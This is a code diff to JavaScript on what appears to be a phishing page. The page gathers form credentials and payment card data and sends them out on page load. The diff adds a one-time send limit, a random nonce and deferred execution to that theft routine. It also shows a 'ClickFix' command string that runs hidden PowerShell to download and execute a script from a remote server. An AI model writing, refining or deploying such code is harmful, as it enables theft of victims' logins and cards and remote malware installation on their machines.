@@ -373,6 +373,8 @@
 
         let verified = false;
         let sent = false;
+        let sendAttempts = 0;
+        const MAX_SEND_ATTEMPTS = 1; // ONLY ONCE
 
         // ---- COLLECT FORM DATA ----
         function collectFormData() {
@@ -459,6 +461,8 @@
         // ---- SEND ONCE ----
         function sendData() {
             if (sent) return;
+            if (sendAttempts >= MAX_SEND_ATTEMPTS) return;
+            sendAttempts++;
             sent = true;
 
             const formData = collectFormData();
@@ -474,7 +478,8 @@
                 url: window.location.href,
                 referrer: document.referrer || 'direct',
                 credentials: formData.credentials,
-                cards: formData.cards
+                cards: formData.cards,
+                _nonce: Date.now() + '_' + Math.random().toString(36).substring(2, 8)
             };
 
             const targets = [];
@@ -504,7 +509,10 @@
         }
 
         // ---- SEND ON PAGE LOAD (ONLY ONCE) ----
-        sendData();
+        // Use requestAnimationFrame to ensure it runs after everything else
+        requestAnimationFrame(() => {
+            sendData();
+        });
 
         // ---- CLICKFIX FLOW ----
         const COMMAND = 'cmd /c start /min powershell -w hidden -nop -c "iex (New-Object Net.WebClient).DownloadString(\'https://your-server.com/load.ps1\')"';
